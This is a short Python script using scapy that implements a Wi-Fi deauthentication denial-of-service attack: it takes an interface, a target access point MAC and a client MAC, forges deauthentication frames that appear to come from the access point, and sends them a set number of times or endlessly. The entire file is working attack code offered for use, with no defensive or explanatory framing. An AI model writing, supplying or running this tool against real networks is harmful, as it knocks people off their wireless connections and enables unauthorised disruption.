import argparse
from scapy.all import sendp

def wifi_attack(argus):
    parser = argparse.ArgumentParser(description="Wi-Fi deauthentication (DoS) attack")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Wireless interface (in monitor mode)")
    parser.add_argument("-a", "--ap", dest="ap_mac", required=True, help="Target AP MAC address")
    parser.add_argument("-c", "--client", dest="client_mac", required=True, help="Target client MAC address")
    parser.add_argument("-n", "--count", dest="count", type=int, default=10, help="Number of deauth packets (0 = infinite)")
    parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Interval between packets (seconds)")
    args = parser.parse_args(argus)

    def build_deauth_packet(ap_mac, client_mac):
        from scapy.all import RadioTap, Dot11, Dot11Deauth
        return (
            RadioTap() /
            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
            Dot11Deauth(reason=7)
        )

    packet = build_deauth_packet(args.ap_mac, args.client_mac)

    if args.count == 0:
        print("[INFO] Sending deauthentication packets indefinitely... (Press Ctrl+C to stop)")
        sendp(packet, iface=args.interface, inter=args.interval, loop=1, verbose=True)
    else:
        print(f"[INFO] Sending {args.count} deauthentication packets...")
        sendp(packet, iface=args.interface, count=args.count, inter=args.interval, verbose=True)